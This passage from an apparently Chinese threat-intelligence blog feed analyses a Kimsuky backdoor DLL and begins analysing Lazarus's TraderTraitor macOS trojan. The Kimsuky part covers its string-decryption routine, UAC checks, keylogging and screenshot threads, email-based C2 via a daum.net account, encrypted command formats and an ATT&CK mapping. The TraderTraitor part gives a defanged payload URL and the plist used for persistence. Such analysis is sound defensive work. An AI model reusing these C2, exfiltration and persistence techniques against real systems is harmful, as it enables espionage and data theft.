class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">str</span> = s_bytes[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    decrypt_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> :</span><br><span class="line">            ch = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ch = <span class="built_in">str</span>[i-<span class="number">1</span>]</span><br><span class="line">        ch = key[i%<span class="number">16</span>] ^ ch ^ <span class="built_in">str</span>[i]</span><br><span class="line">        decrypt_str  = <span class="string">&quot;%s%c&quot;</span>%(decrypt_str,ch)</span><br><span class="line">    <span class="built_in">print</span>(decrypt_str)</span><br></pre></td></tr></table></figure><h2 id="2-判断互斥量"><a href="#2-判断互斥量" class="headerlink" title="2.判断互斥量"></a>2.判断互斥量</h2><p>恶意程序在API解析完成后会判断互斥量”SpyRegsvr32-20210604170153”是否存在，如果存在则退出程序避免重复允许。</p><p><img src="e22d03da/e5c332f450bdbc5ea14455b496e729de.png"></p><h2 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3.权限提升"></a>3.权限提升</h2><p>恶意程序通过检测<strong>ConsentPromptBehaviorAdmin</strong>和<strong>PromptOnSecureDesktop</strong>的值来判断UAC是否被启用,如果这两个注册表项值都为0, 则表示UAC已被禁用无需做提权操作。</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System </span><br><span class="line">ㄴConsentPromptBehaviorAdmin</span><br><span class="line">- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><br><span class="line">ㄴ PromptOnSecureDesktop</span><br></pre></td></tr></table></figure><p>UAC检测代码如下:<br><img src="e22d03da/8f60c6aec4c729240b4789026519e872.png"></p><p>判断当前进程是否有TokenElevation。<br><img src="e22d03da/f2b01f32aae15b5a3cc57b4185027159.png"></p><p>如果UAC被禁用并且当前进程没有TokenElevation，则通过powershell来间接使用regsvr32启动恶意进程，此时恶意程序具有与regsvr32相同的权限。<br><img src="e22d03da/924f50f65b2447a01ef12003afb8e41e.png"></p><h2 id="4-线程执行主要功能"><a href="#4-线程执行主要功能" class="headerlink" title="4. 线程执行主要功能"></a>4. 线程执行主要功能</h2><p>恶意程序使用多个线程来实现主要功能, 创建的线程如下:<br><img src="e22d03da/251842892f85473c75ab892639242295.png"></p><h3 id="1-屏幕截图线程"><a href="#1-屏幕截图线程" class="headerlink" title="1. 屏幕截图线程"></a>1. 屏幕截图线程</h3><p>该线程的主要功能为每隔5分钟屏幕截图依次并通过SMTP协议发送到邮件服务。截图后文件保存到目录”c:\\programData\\{random}.tmp”,当整个文件的数据被加密时，文件名改成” {random }.tmp.tmp”。</p><h3 id="2-键盘按键记录线程"><a href="#2-键盘按键记录线程" class="headerlink" title="2. 键盘按键记录线程"></a>2. 键盘按键记录线程</h3><p>该线程的主要功能为监听带有窗口名称的按键记录,它每记录256次按键就将其写入到文件,然后休眠1秒，最后每隔10分钟发送按键记录文件到邮件服务。<br><img src="e22d03da/046cb4fa5d55f8d98b7410874f8eb655.png"></p><h3 id="3-文件监控线程"><a href="#3-文件监控线程" class="headerlink" title="3. 文件监控线程"></a>3. 文件监控线程</h3><p>该线程的主要功能是每隔一分钟从指定的目录搜索指定后缀的文件。这些目录分别是:</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">Desktop</span></span>%</span><br><span class="line"><span class="tag">%<span class="selector-tag">Downloads</span></span>%</span><br><span class="line"><span class="tag">%<span class="selector-tag">Documents</span></span>%</span><br><span class="line">AppData\Local\Microsoft\Windows\INetCache\IE</span><br></pre></td></tr></table></figure><p>如果发现指定后缀的文件,将文件名写入到文件list.fdb中。<br><img src="e22d03da/1d606ab1e8432c7d2b41071b5afa5201.png"></p><h3 id="4-USB文件监控线程"><a href="#4-USB文件监控线程" class="headerlink" title="4. USB文件监控线程"></a>4. USB文件监控线程</h3><p>恶意程序通过函数get_usbs找到所有存在的USB驱动器,然后通过dir命令获取该驱动器的文件列表，压缩加密后发送的邮件服务。<br><img src="e22d03da/293d17083a9a7138c295fc3603c3a0fe.png"></p><h3 id="5-泄露文件列表线程"><a href="#5-泄露文件列表线程" class="headerlink" title="5. 泄露文件列表线程"></a>5. 泄露文件列表线程</h3><p>该文件由于恶意程序从受害者机器上收集的各种数据，该文件被保存到路径:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="name">C</span>:\ProgramData\Software\ESTsoft\Common\list.fdb</span><br></pre></td></tr></table></figure><p>文件格式如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span></span><br><span class="line">&#123;</span><br><span class="line">Uint16_t magic;<span class="comment">//值为0xFEFF</span></span><br><span class="line">Char* file_or_dir_name[];<span class="comment">//多个完整文件名或目录名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该线程的主要功能是将list.fdb中的文件或目录列表信息压缩加密后发送到邮件服务。一旦发送成功，恶意程序就会将list.fdb中包含文件或目录列表的数据清除，只留下magic部分。</p><h2 id="5-C-amp-C解密"><a href="#5-C-amp-C解密" class="headerlink" title="5.C&amp;C解密"></a>5.C&amp;C解密</h2><h3 id="读取电子邮件"><a href="#读取电子邮件" class="headerlink" title="读取电子邮件"></a>读取电子邮件</h3><p>&emsp;&emsp;攻击者将邮件服务作为发送C&amp;C指令和接收泄露数据信息的中转站,C&amp;C指令由C&amp;C服务器发起,并以电子邮件的形式存放在特定邮件账户的特定目录中，邮件正文无任何内容但是包含由加密的附件，该附件提供后门要执行的命令。恶意程序每隔30秒。邮件读取过程如下:</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发送IMAP命令”<span class="built_in">UID</span> SEARCH ALL”获取所有邮件的<span class="built_in">UID</span>。收到的响应内容为”\* SEARCH <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>”,后面的数字就是邮件的uid号</span><br><span class="line">根据获取到的uid发送请求到邮件服务获取邮件数据,请求链接为 imaps:<span class="comment">//imap.daum.net:993/cmd/;Uid=&#123;uid&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p> 1.在邮件搜索关键字” Subject:”找到邮件主题数据<br> 2.附件内容在邮件主题中以base64编码, 以”filename=”开头,结尾一般是”–”，因此搜索这两个字符串就能找到对应的附件数据。<br> 3.附件保存为临时文件,发送post请求让邮件服务删除该邮件。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求连接: imaps:<span class="regexp">//im</span>ap.daum.net:<span class="number">993</span><span class="regexp">/cmd/</span>;Uid=&#123;uid&#125;</span><br><span class="line">传输参数：STORE <span class="number">1</span> +Flags \Deleted</span><br></pre></td></tr></table></figure><h3 id="电子邮件附件解密"><a href="#电子邮件附件解密" class="headerlink" title="电子邮件附件解密"></a>电子邮件附件解密</h3><p>&emsp;&emsp;恶意程序通过SMTP协议从账号为<a href="mailto:k2x0604@daum.net">k2x0604@daum.net</a>的邮箱的cmd文件夹中获取要执行的C&amp;C命令,<br>C&amp;C指令以加密的形式存放在邮件附件中。<br>&emsp;&emsp;恶意程序获取到邮件后首先将邮件附件下载并第一次解密后保存到临时目录，文件名为**{temp_name}.enc。邮件附件使用如下结构保存加密的C&amp;C指令数据。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Struct encrypt_Command</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//伪装成pdf文件,值为%PDF-1.7..4 0 obj</span></span><br><span class="line">Char fake_pdf_head<span class="selector-attr">[0x10]</span>;</span><br><span class="line"><span class="comment">//xor_key 和 encrypt_command的CRC32值的取反值</span></span><br><span class="line"><span class="comment">//用于验证数据是否被修改</span></span><br><span class="line">Uint32_t vertifity_crc; </span><br><span class="line"><span class="comment">//用于解密C&amp;C指令</span></span><br><span class="line">Char  xor_key<span class="selector-attr">[0x10]</span>; </span><br><span class="line"><span class="comment">//加密的C&amp;C指令</span></span><br><span class="line">Charencrypt_command<span class="selector-attr">[]</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;首先查找PDF标识,如果不是则取消解密操作,否则进行解密C&amp;C指令操作。恶意程序通过将邮件附件伪装成PDF文件的手段绕过邮件安全系统的检测。<br><img src="e22d03da/296154e1a385bb7a7721d06f1079e4d0.png"></p><p>&emsp;&emsp;恶意程序采用自定义算法生成一个key，该key与xor_key、encrypt_command通过自定义算法计算出crc32值，将该值取反后与vertifity_crc比较来验证邮件附件是否被修改过。<br><img src="e22d03da/af0f63d161eb2ca32b98224b426e4385.png"></p><p>&emsp;&emsp;解密加密的C&amp;C指令时，使用xor_key来进行解密；解密后写入临时文件。<br><img src="e22d03da/d98d23080a225463330b81c34ad5acea.png"></p><h3 id="C-amp-C指令解密"><a href="#C-amp-C指令解密" class="headerlink" title="C&amp;C指令解密"></a>C&amp;C指令解密</h3><p>&emsp;&emsp;恶意程序在第一次解密邮件附件后，C&amp;C指令部分仍处于加密状态，对应的格式如下:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Struct encrypt_cmd</span><br><span class="line">&#123;</span><br><span class="line">Uint32_t cmd_len;<span class="comment">//解密后C&amp;C指令数据的大小</span></span><br><span class="line">Char key<span class="selector-attr">[0x80]</span>;<span class="comment">//使用RAS算法加密的RC4密钥</span></span><br><span class="line">Char crypt_cmd<span class="selector-attr">[]</span>;<span class="comment">//已加密的C&amp;C指令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;为防止被人解密出C&amp;C指令数据，攻击者将用于解密C&amp;C指令的RC4密钥用RSA算法加密，即发送邮件时使用公钥对RC4密钥加密，接收到邮件时使用RSA私钥解密RC4密钥。<br>&emsp;&emsp;RSA公钥与密钥以硬编码和加密的形式存放在程序内，解密方法与解密字符串一样。解密后的数据为十六进制字符串，转换成十六进制为对应的<strong>MicrosoftBlob Format</strong>格式，使用程序openssl可以将其转换成文本形式。</p><p>解密后的RSA 公钥如下:<br><img src="e22d03da/930d3b3c438ad0f6d625e7e3d5656faf.png"></p><p>解密后的RSA私钥如下:<br><img src="e22d03da/7530cb89255fd36f2e458c49010c16a0.png"></p><p>&emsp;&emsp;恶意程序将要发送的数据加密后上传到电子邮件附件然后发送到邮件服务。对数据加密的过程如下:</p><blockquote><p>1.生成大小为117的随机数并计算其md5值作为RC4算法的密钥<br>2.使用RSA公钥加密RC4密钥<br>3.将原始数据长度写入文件，长度为4字节<br>4.将加密后的RC4密钥写入文件，长度为0x80字节<br>5.加密要加密的数据，并写入文件</p></blockquote><p>代码实现如下图</p><p><img src="e22d03da/d03579fbd36f7e0c26767814ae5fa129.png"></p><p>恶意程序接从邮件服务获取邮件时解密邮件附件得到加密的C&amp;C指令，解密过程如下:</p><blockquote><p>1.从邮件附件中读取被加密的RC4密钥<br>2.使用RSA私钥解密RC4密钥<br>3.使用RC4密钥解密加密的C&amp;C指令</p></blockquote><p>代码实现如下图:<br><img src="e22d03da/eed7383053999702c7c3dab13d1c749a.png"></p><p>从对邮件附件的加密解密来看，RC4算法使用的密钥为随机生成并且被RSA算法加密，只要RSA密钥不被泄露，想要解密数据目前是很困难的。</p><h3 id="指令读取"><a href="#指令读取" class="headerlink" title="指令读取"></a>指令读取</h3><p>恶意程序要执行的指令包含在由攻击者通过邮件服务发送的电子邮件附件中，C&amp;C指令部分解密后使用的结构如下:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Struct C2C_command</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint32</span>_t commandID;<span class="comment">//指令ID</span></span><br><span class="line"><span class="built_in">uint32</span>_t param_cnt;<span class="comment">//参数个数</span></span><br><span class="line"><span class="built_in">uint32</span>_t* params_size;<span class="comment">//保存每个参数的大小</span></span><br><span class="line"><span class="built_in">void</span>*params;<span class="comment">//保存所有的参数,参数大小由字段params_size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C&amp;C指令读取代码如下:<br><img src="e22d03da/d0a655c2e6f53c1412b80f0daa73dbd7.png"></p><h2 id="6-C-amp-C指令"><a href="#6-C-amp-C指令" class="headerlink" title="6.C&amp;C指令"></a>6.C&amp;C指令</h2><p>C&amp;C指令由恶意程序从邮件附件中解密而来，主要由以下几种:</p><table><thead><tr><th>C&amp;C指令</th><th>描述</th></tr></thead><tbody><tr><td>0x64</td><td>写入数据到list.fdb</td></tr><tr><td>0x66</td><td>创建文件</td></tr><tr><td>0x65</td><td>启用或禁用恶意程序的主要功能</td></tr><tr><td>0x00</td><td>子指令1:执行文件并返回输出结果</td></tr><tr><td>0x00</td><td>子指令1或3: 通过regsvr32.exe执行命令</td></tr><tr><td>0x02</td><td>DLL注入</td></tr></tbody></table><h3 id="1-写入文件或目录列表到list-fdb"><a href="#1-写入文件或目录列表到list-fdb" class="headerlink" title="1. 写入文件或目录列表到list.fdb"></a>1. 写入文件或目录列表到list.fdb</h3><p>攻击者在该文件中写入想要从受害者机器上获取的文件和目录，等到下一次执行泄露文件列表线程时将这些文件泄露出去。该命令使用的结构如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span>&#123;</span><br><span class="line">Uint32_t commid;<span class="comment">//0x64</span></span><br><span class="line">Uint32_t param_cnt;<span class="comment">//参数个数为1</span></span><br><span class="line">Uint32_t param_size;<span class="comment">//参数大小</span></span><br><span class="line">Uint8 param[];<span class="comment">//包含文件列表或者目录列表，使用”\r\n”分隔</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-文件创建"><a href="#2-文件创建" class="headerlink" title="2. 文件创建"></a>2. 文件创建</h3><p>该指令主要用于攻击在在受害者机器上创建文件，使用的指令格式为:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span>&#123;</span><br><span class="line">Uint32_t command_id;<span class="comment">//0x66</span></span><br><span class="line">Uint32_t param_cnt;<span class="comment">//个数为2，文件名和文件数据</span></span><br><span class="line">Uint32_t file_size;<span class="comment">//文件数据大小</span></span><br><span class="line">Uint8_t  file[file_size]; <span class="comment">//文件数据</span></span><br><span class="line">Uint32_t file_name_len;<span class="comment">//文件名长度</span></span><br><span class="line">Uint8_t file_name[file_name_len];<span class="comment">//文件名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-关闭或启用主要功能"><a href="#3-关闭或启用主要功能" class="headerlink" title="3. 关闭或启用主要功能"></a>3. 关闭或启用主要功能</h3><p>该指令的主要功能用于开启或者关闭主要功能,比如键盘按键记录、文件监控、屏幕截图等等。该指令使用的格式如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span>&#123;</span><br><span class="line">Uint32_t command_id;<span class="comment">//0x65</span></span><br><span class="line">Uint32_t param_cnt;<span class="comment">//参数个数为4</span></span><br><span class="line">Uint32_t param1_len;<span class="comment">//参数1长度,值为1</span></span><br><span class="line"><span class="keyword">Bool</span> enable_keyboard_mon;<span class="comment">//1为启用,0为关闭</span></span><br><span class="line">Uint32_t param2_len;<span class="comment">//值为1</span></span><br><span class="line"><span class="keyword">Bool</span> enable_screen_mon;<span class="comment">//1为启用，0为关闭</span></span><br><span class="line">Uint32_t param3_len;<span class="comment">//值为1</span></span><br><span class="line"><span class="keyword">Bool</span> enable_folder_mon;<span class="comment">//1为启用,0为关闭</span></span><br><span class="line">Uint32_t param4_len;<span class="comment">//值为1</span></span><br><span class="line"><span class="keyword">Bool</span> enable_usb_mon;<span class="comment">//1为启用,0为关闭。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-执行命令并返回执行结果"><a href="#4-执行命令并返回执行结果" class="headerlink" title="4. 执行命令并返回执行结果"></a>4. 执行命令并返回执行结果</h3><p>该指令的主要功能为在受害者机器上执行命令，并将执行后的结果发送到邮件服务。<br>该指令使用的结构如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span>&#123;</span><br><span class="line">Uint32_t command_id;<span class="comment">//值为0</span></span><br><span class="line">Uint32_t param_cnt;<span class="comment">//值为1，使用一个参数</span></span><br><span class="line">Uint32_t cmd_str_len;<span class="comment">//命令字符串的长度</span></span><br><span class="line">Wchar_t  cmd_str[cmd_str_len];<span class="comment">//命令字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-使用regsvr32-exe调用dll程序"><a href="#5-使用regsvr32-exe调用dll程序" class="headerlink" title="5. 使用regsvr32.exe调用dll程序"></a>5. 使用regsvr32.exe调用dll程序</h3><p>该指令主要是使用<strong>regsvc32.exe</strong>来调用dll文件，前提是该dll文件导出了函数<strong>DllRegisterServer。</strong>dll文件下载后保存到临时目录,使用regsvr32.exe注册成功后将该dll文件删除。该指令使用的格式如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span>&#123;</span><br><span class="line">Uint32_t command_id;<span class="comment">//值为0</span></span><br><span class="line">Uint32_t param_cnt;<span class="comment">//参数个数</span></span><br><span class="line">Uint32_t file_size;<span class="comment">//文件长度</span></span><br><span class="line">Uint32_t dll_file_data;<span class="comment">//文件数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-dll注入"><a href="#6-dll注入" class="headerlink" title="6. dll注入"></a>6. dll注入</h3><p>该命令的功能主要为将dll注入到进程中，使用的结构如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">format</span>&#123;</span><br><span class="line">Uint32_t command_id;<span class="comment">//值为2</span></span><br><span class="line">Uint32_t param_cnt;<span class="comment">//使用两个参数</span></span><br><span class="line">Uint32_t name_len;<span class="comment">//函数名长度</span></span><br><span class="line">Uint8_t function_name[name_len];<span class="comment">//函数名</span></span><br><span class="line">Uint32_t file_size;<span class="comment">//dll文件长度</span></span><br><span class="line">Uint8_t file_buf[file_size];<span class="comment">//dll文件数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将接收到的dll注入到指定的进程中，并执行指令中给定的导出函数function_name。</p><h1 id="7-ATT-amp-CK矩阵"><a href="#7-ATT-amp-CK矩阵" class="headerlink" title="7. ATT&amp;CK矩阵"></a>7. ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td><td>通过邮件泄露数据</td></tr><tr><td>Command and Control</td><td>T1071.003</td><td>Application Layer Protocol：Mail Protocols</td><td>使用邮件服务接收泄露数据或发送C&amp;C指令</td></tr><tr><td></td><td>T1001</td><td>Data Obfuscation</td><td>使用RC4加密或解密数据,使用RSA算法加密RC4密钥</td></tr><tr><td>Collection</td><td>T1113</td><td>Screen Capture</td><td>屏幕截图</td></tr><tr><td></td><td>T1056</td><td>Input Capture</td><td>按键记录</td></tr><tr><td></td><td>T1560</td><td>Archive Collected Data</td><td>使用ZIP算法压缩收集的数据</td></tr><tr><td></td><td>T1005</td><td>Data from Local System</td><td>搜索本地文件</td></tr><tr><td></td><td>T1025</td><td>Data from Removable Media</td><td>从USB驱动器收集数据</td></tr><tr><td>Discovery</td><td>T1083</td><td>File and Directory Discovery</td><td>遍历文件或目录</td></tr><tr><td></td><td>T1082</td><td>System Information Discovery</td><td>获取操作系统版本号用于机器标识符</td></tr><tr><td>Persistence</td><td>T1547</td><td>Boot or Logon Autostart Execution</td><td>注册自启动项</td></tr><tr><td>execution</td><td>T1059</td><td>Command and Scripting Interpreter</td><td>使用cmd执行命令</td></tr></tbody></table><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Kimsuky 是位于朝鲜的APT组织,又名(Mystery Baby, Baby Coin, Smoke Screen,BabyShark, Cobra Venom)等，最早由Kaspersky在2013年披露。&lt;br&gt;&amp;emsp;&amp;emsp;该组织长期针对于韩国的智囊团、政府外交、新闻组织、教育学术组织等进行攻击，在过去几年里，他们将攻击目标扩大到包括美国、俄罗斯和欧洲各国在内的国家。主要目的为窃取情报、间谍活动等。&lt;br&gt;&amp;emsp;&amp;emsp;Kimsuky使用各种鱼叉式网络钓鱼和社会工程方法来获取对受害者网络的初始访问权限。&lt;/p&gt;
&lt;h1 id=&quot;2-样本详情&quot;&gt;&lt;a href=&quot;#2-样本详情&quot; class=&quot;headerlink&quot; title=&quot;2. 样本详情&quot;&gt;&lt;/a&gt;2. 样本详情&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件名&lt;/th&gt;
&lt;th&gt;ESTCommon.dll&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Md5&lt;/td&gt;
&lt;td&gt;6844589e2962b3914824cc8b90a552a6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;Dll x64&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;4-详细分析&quot;&gt;&lt;a href=&quot;#4-详细分析&quot; class=&quot;headerlink&quot; title=&quot;4. 详细分析&quot;&gt;&lt;/a&gt;4. 详细分析&lt;/h1&gt;&lt;h2 id=&quot;1-字符串解密&quot;&gt;&lt;a href=&quot;#1-字符串解密&quot; class=&quot;headerlink&quot; title=&quot;1.字符串解密&quot;&gt;&lt;/a&gt;1.字符串解密&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;恶意程序将所有可见的字符串和重要的API使用自定义的加密算法进行加密，加密后的数据以十六进制的ANSII格式存放,当需要使用时调用解密函数进行解密。如下图:&lt;/p&gt;
&lt;img src=&quot;/post/e22d03da/d12b734d856919c9b7fc852e9d225e77.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>TraderTraitor：朝鲜国家赞助的 APT 瞄准区块链公司</title>
    <link href="http://shxi.cc/post/7427f1ce.html"/>
    <id>http://shxi.cc/post/7427f1ce.html</id>
    <published>2022-06-13T08:34:38.000Z</published>
    <updated>2024-01-10T12:56:06.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;近期观察到Lazarus正在针对区块链技术和加密货币行业的各种组织，包括加密货币交易所、去中心化金融协议、游戏赚钱加密货币视频游戏、加密货币贸易公司、风险投资基金投资在加密货币中，以及大量加密货币或有价值的不可替代代币的个人持有者。<br>&emsp;&emsp;Lazarus使用各种通信平台对受害者进行社会工程学，以鼓励受害在在windows或者macOS上下载木马化的加密货币应用程序，然后攻击者使用这些应用程序访问受害者的计算机，在受害者的网络环境中传播恶意软件，并获取私钥或利用其他安全漏洞。这些活动支持发起欺诈性区块链交易的其他后续活动。</p><h1 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h1><table><thead><tr><th>文件名</th><th>Md5</th></tr></thead><tbody><tr><td>Esilet.dmg</td><td>53d9af8829a9c7f6f177178885901c01</td></tr><tr><td>Esilet-tmpg7lpp</td><td>9578c2be6437dcc8517e78a5de1fa975</td></tr></tbody></table><h1 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h1><h2 id="2-1-Esilet-dmg分析"><a href="#2-1-Esilet-dmg分析" class="headerlink" title="2.1 Esilet.dmg分析"></a>2.1 Esilet.dmg分析</h2><p>&emsp;&emsp;该恶意程序通过macOS系统专用的磁盘映像格式dmg分发，可以通过命令hdiutil来挂载文件并提取应用程序。</p><img src="/post/7427f1ce/47e76d051067a5463fc12595faf3c895.png" class="" title="example"><span id="more"></span><p>&emsp;&emsp;执行后的界面如下，看起来像是合法的加密货币交易平台。该恶意程序声称能够实时提供加密货币价格和价格预测。<br><img src="7427f1ce/c0830ea34b368179ec2534d4fb753462.png"></p><p>&emsp;&emsp;查看挂载应用的文件系统则可以发现使用了Electon框架。Electon是一个有Javascript、HTML和CSS等web技术创建的本地应用程序的GUI框架。<br><img src="7427f1ce/54f9a426e9b4939f765c15d06a417325.png"></p><p>&emsp;&emsp;使用Electron打包的应用程序一般都会存在一个文件<strong>app.asar</strong>，该文件类似于tar，是一种压缩格式。</p><p><img src="7427f1ce/9ee42773021896f20cc97505db33cfc2.png"></p><p>&emsp;&emsp;使用如下命令可以对app.asar进行解包：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npx asar extract </span><br><span class="line"><span class="regexp">/Volumes/</span>Esilet<span class="regexp">/Esilet.app/</span>Contents<span class="regexp">/Resources/</span>app.asar  <span class="regexp">/Users/</span>ken<span class="regexp">/Desktop/u</span>npacked</span><br></pre></td></tr></table></figure><p>查看解包后的文件<strong>renderer.prod.js</strong>可以得知Esilet.dmg 執行後，会从</p><p><strong>hxxps://esilet[.]com/update/darwin.json</strong>下载文件文件保存到macOS系统的临时目录，保存文件名为<strong>Esilet-tmpg7lpp</strong>，通过方法child_process执行下载的文件。</p><p><img src="7427f1ce/6de0de685b3ffe9fc2c8f06a3a784417.png"></p><h2 id="2-2-Esilet-tmpg7lpp分析"><a href="#2-2-Esilet-tmpg7lpp分析" class="headerlink" title="2.2 Esilet-tmpg7lpp分析"></a>2.2 Esilet-tmpg7lpp分析</h2><h3 id="1-持久化"><a href="#1-持久化" class="headerlink" title="1. 持久化"></a>1. 持久化</h3><p>用于持久化的plist文件被硬编码在恶意程序文件内,恶意程序执行后根据执行用户的uid来决定将plist文件保存的目录,<br>保存文件名为:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.applex</span><span class="selector-class">.services</span><span class="selector-class">.agent</span><span class="selector-class">.agent</span>.plist</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过BSD API函数getuid来获取执行用户的uid, 当uid为0时属于root用户,<br>该用户有权限访问**/Library/LaunchDaemons<strong>目录,因此将plist文件保存到该目录。否则保存到</strong>{HomeDirectory}/Library/LaunchAgents**。</p><p><img src="7427f1ce/5f8443c0b1bdad5c1327fba1b51ab0a0.png"></p><p>plist文件内容如下，是一个标准的LaunchAgent，通过设置RunAtLoad的值为true来确保每次用户登录时都会自动启动恶意软件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 